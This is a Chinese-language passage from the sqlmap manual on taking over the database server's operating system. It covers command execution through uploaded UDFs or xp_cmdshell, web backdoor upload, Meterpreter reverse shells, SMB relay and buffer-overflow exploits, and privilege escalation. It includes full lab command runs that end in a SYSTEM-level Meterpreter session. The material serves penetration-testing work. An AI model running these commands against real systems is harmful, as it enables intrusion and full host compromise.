## 接管操作系统

### 运行任意操作系统命令

选项和开关：`--os-cmd` 和 `--os-shell`

当后端 DBMS（Database Management System，数据库管理系统）为 MySQL，PostgreSQL 或 Microsoft SQL Server，并且当前会话用户拥有对数据库特定功能和相关架构特性的利用权限时，sqlmap 能够在**数据库所在服务器的操作系统上运行任意的命令**。

在 MySQL 和 PostgreSQL 中，sqlmap 可以上传（通过前面描述的文件上传功能）一个包含两个用户自定义函数——分别为 `sys_exec()` 和 `sys_eval()` 的共享库（二进制文件），然后在数据库中创建出两个对应函数，并调用对应函数执行特定的命令，并允许用户选择是否打印出相关命令执行的结果。在 Microsoft SQL Server 中，sqlmap 会利用 `xp_cmdshell` 存储过程：如果该存储过程被关闭了（Microsoft SQL Server 的 2005 及以上版本默认关闭），sqlmap 则会将其重新打开；如果该存储过程不存在，sqlmap 则会重新创建它。

当用户请求标准输出，sqlmap 将使用任何可用的 SQL 注入技术（盲注、带内注入、报错型注入）去获取对应结果。相反，如果无需标准输出对应结果，sqlmap 则会使用堆叠查询注入技术执行相关的命令。

这些技术的相关详情可见白皮书[通过高级 SQL 注入，对操作系统进行完全控制](http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-system-full-control-whitepaper-4633857)。

针对 PostgreSQL 目标的示例：

```
$ python sqlmap.py -u "http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1" --\
os-cmd id -v 1

[...]
web application technology: PHP 5.2.6, Apache 2.2.9
back-end DBMS: PostgreSQL
[hh:mm:12] [INFO] fingerprinting the back-end DBMS operating system
[hh:mm:12] [INFO] the back-end DBMS operating system is Linux
[hh:mm:12] [INFO] testing if current user is DBA
[hh:mm:12] [INFO] detecting back-end DBMS version from its banner
[hh:mm:12] [INFO] checking if UDF 'sys_eval' already exist
[hh:mm:12] [INFO] checking if UDF 'sys_exec' already exist
[hh:mm:12] [INFO] creating UDF 'sys_eval' from the binary UDF file
[hh:mm:12] [INFO] creating UDF 'sys_exec' from the binary UDF file
do you want to retrieve the command standard output? [Y/n/a] y
command standard output:    'uid=104(postgres) gid=106(postgres) groups=106(post
gres)'

[hh:mm:19] [INFO] cleaning up the database management system
do you want to remove UDF 'sys_eval'? [Y/n] y
do you want to remove UDF 'sys_exec'? [Y/n] y
[hh:mm:23] [INFO] database management system cleanup finished
[hh:mm:23] [WARNING] remember that UDF shared object files saved on the file sys
tem can only be deleted manually
```

sqlmap 还支持模拟 shell 输入，你可以输入任意命令以执行。对应的选项是 `--os-shell`，并且和 `--sql-shell` 一样，具备 TAB 补全和记录历史命令的功能。

如果堆叠查询没有被 Web 应用（例如：PHP 或 ASP 且后端 DBMS 为 MySQL）识别出来，并且 DBMS 为 MySQL，假如后端 DBMS 和 Web 服务器在同一台服务器上，则仍可以通过利用 `SELECT` 语句中的 `INTO OUTFILE`，在 Web 服务器根目录中的可写目录中创建 Web 后门，从而执行命令。sqlmap 支持上述功能并允许用户提供一个逗号分隔、用于指定根目录子目录的列表，从而尝试上传 Web 文件传输器和后续的 Web 后门。sqlmap 有以下几种语言的 Web 文件传输器和后门：

* ASP
* ASP.NET
* JSP
* PHP

###  有状态带外连接：Meterpreter & friends

开关和选项：`--os-pwn`，`--os-smbrelay`，`--os-bof`，`--priv-esc`，`--msf-path` 和 `--tmp-path`

当后端 DBMS 为 MySQL，PostgreSQL 或 Microsoft SQL Server 时，并且当前会话用户拥有对数据库特定功能和架构缺陷的利用权限时，sqlmap 能够在**攻击者机器与数据库服务器之间建立起有状态带外 TCP 连接**。根据用户的选择，该连接可以是交互式命令行、Meterpreter 会话、或者图形用户界面（VNC）会话。

sqlmap 依赖 Metasploit 创建 shellcode，并实现了四种不同的技术在数据库服务器上执行它。这些技术分别是：

* 通过 sqlmap 的用户自定义函数 `sys_bineval()` 在数据库**内存中执行 Metasploit shellcode**。MySQL 和 PostgreSQL 支持该技术，通过开关 `--os-pwn` 启用。
* 通过 sqlmap 的用户自定义函数 `sys_exec()` 向 MySQL 和 PostgreSQL 上传一个 Metasploit **独立 payload 传输器**并执行，对于 Microsoft SQL Server 则是使用 `xp_cmdshell()` 函数，通过开关 `--os-pwn` 启用。
* 通过进行从数据库服务器到攻击者机器（由 Metasploit `smb_relay` 服务监听）之间的 UNC 路径请求的 **SMB 反射攻击**（[MS08-068](http://www.microsoft.com/technet/security/Bulletin/MS08-068.mspx)）来执行 Metasploit shellcode。当 sqlmap 运行于具有高权限（`uid=0`）的 Linux/Unix 上，且目标 DBMS 以 Windows 管理员身份运行时支持该技术，通过开关 `--os-smbrelay` 启用。
* 通过利用 **Microsoft SQL Server 2000 和 2005 的 `sp_replwritetovarbin` 存储过程堆缓冲区溢出**（[MS09-004](http://www.microsoft.com/technet/security/bulletin/ms09-004.mspx)）在数据库内存中执行 Metasploit shellcode。sqlmap 使用自己的 exploit，自动绕过 DEP 内存保护来触发漏洞，但它依赖 Metasploit 生成 shellcode，以便在成功利用时执行，通过开关 `--os-bof` 启用。

相关的技术详情可见于白皮书[通过高级 SQL 注入完全控制操作系统](http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-system-full-control-whitepaper-4633857)和幻灯片[将控制由数据库层面拓展到操作系统](http://www.slideshare.net/inquis/expanding-the-control-over-the-operating-system-from-the-database)。

针对 MySQL 目标的示例：

```
$ python sqlmap.py -u "http://192.168.136.129/sqlmap/mysql/iis/get_int_55.aspx?\
id=1" --os-pwn --msf-path /software/metasploit

[...]
[hh:mm:31] [INFO] the back-end DBMS is MySQL
web server operating system: Windows 2003
web application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 6.0
back-end DBMS: MySQL 5.0
[hh:mm:31] [INFO] fingerprinting the back-end DBMS operating system
[hh:mm:31] [INFO] the back-end DBMS operating system is Windows
how do you want to establish the tunnel?
[1] TCP: Metasploit Framework (default)
[2] ICMP: icmpsh - ICMP tunneling
> 
[hh:mm:32] [INFO] testing if current user is DBA
[hh:mm:32] [INFO] fetching current user
what is the back-end database management system architecture?
[1] 32-bit (default)
[2] 64-bit
> 
[hh:mm:33] [INFO] checking if UDF 'sys_bineval' already exist
[hh:mm:33] [INFO] checking if UDF 'sys_exec' already exist
[hh:mm:33] [INFO] detecting back-end DBMS version from its banner
[hh:mm:33] [INFO] retrieving MySQL base directory absolute path
[hh:mm:34] [INFO] creating UDF 'sys_bineval' from the binary UDF file
[hh:mm:34] [INFO] creating UDF 'sys_exec' from the binary UDF file
how do you want to execute the Metasploit shellcode on the back-end database und
erlying operating system?
[1] Via UDF 'sys_bineval' (in-memory way, anti-forensics, default)
[2] Stand-alone payload stager (file system way)
> 
[hh:mm:35] [INFO] creating Metasploit Framework multi-stage shellcode 
which connection type do you want to use?
[1] Reverse TCP: Connect back from the database host to this machine (default)
[2] Reverse TCP: Try to connect back from the database host to this machine, on 
all ports 
between the specified and 65535
[3] Bind TCP: Listen on the database host for a connection
> 
which is the local address? [192.168.136.1] 
which local port number do you want to use? [60641] 
which payload do you want to use?
[1] Meterpreter (default)
[2] Shell
[3] VNC
> 
[hh:mm:40] [INFO] creation in progress ... done
[hh:mm:43] [INFO] running Metasploit Framework command line interface locally, p
lease wait..

                                _
                                | |      o
_  _  _    _ _|_  __,   ,    _  | |  __    _|_
/ |/ |/ |  |/  |  /  |  / \_|/ \_|/  /  \_|  |
|  |  |_/|__/|_/\_/|_/ \/ |__/ |__/\__/ |_/|_/
                        /|
                        \|


    =[ metasploit v3.7.0-dev [core:3.7 api:1.0]
+ -- --=[ 674 exploits - 351 auxiliary
+ -- --=[ 217 payloads - 27 encoders - 8 nops
    =[ svn r12272 updated 4 days ago (2011.04.07)

PAYLOAD => windows/meterpreter/reverse_tcp
EXITFUNC => thread
LPORT => 60641
LHOST => 192.168.136.1
[*] Started reverse handler on 192.168.136.1:60641 
[*] Starting the payload handler...
[hh:mm:48] [INFO] running Metasploit Framework shellcode remotely via UDF 'sys_b
ineval', please wait..
[*] Sending stage (749056 bytes) to 192.168.136.129
[*] Meterpreter session 1 opened (192.168.136.1:60641 -> 192.168.136.129:1689) a
t Mon Apr 11 hh:mm:52 +0100 2011

meterpreter > Loading extension espia...success.
meterpreter > Loading extension incognito...success.
meterpreter > [-] The 'priv' extension has already been loaded.
meterpreter > Loading extension sniffer...success.
meterpreter > System Language : en_US
OS              : Windows .NET Server (Build 3790, Service Pack 2).
Computer        : W2K3R2
Architecture    : x86
Meterpreter     : x86/win32
meterpreter > Server username: NT AUTHORITY\SYSTEM
meterpreter > ipconfig

MS TCP Loopback interface
Hardware MAC: 00:00:00:00:00:00
IP Address  : 127.0.0.1
Netmask     : 255.0.0.0



Intel(R) PRO/1000 MT Network Connection
Hardware MAC: 00:0c:29:fc:79:39
IP Address  : 192.168.136.129
Netmask     : 255.255.255.0


meterpreter > exit

[*] Meterpreter session 1 closed.  Reason: User exit
```

默认情况下，MySQL 在 Windows 上以 `SYSTEM` 身份运行，然而 PostgreSQL 在 Windows 和 Linux 上均以低权限用户 `postgres` 运行。Microsoft SQL Server 2000 默认以 `SYSTEM` 身份运行，而 Microsoft SQL 2005 和 2008 大部分情况下以 `NETWORK SERVICE` 身份运行，有时候以 `LOCAL SERVICE` 身份运行。

使用 sqlmap 的 `--priv-esc` 开关，可以通过 Metasploit `getsystem` 命令进行**数据库进程用户提权**，该命令使用了包括 [kitrap0d](http://archives.neohapsis.com/archives/fulldisclosure/2010-01/0346.html) 在内的各种技术（[MS10-015](http://www.microsoft.com/technet/security/bulletin/ms10-015.mspx)）。
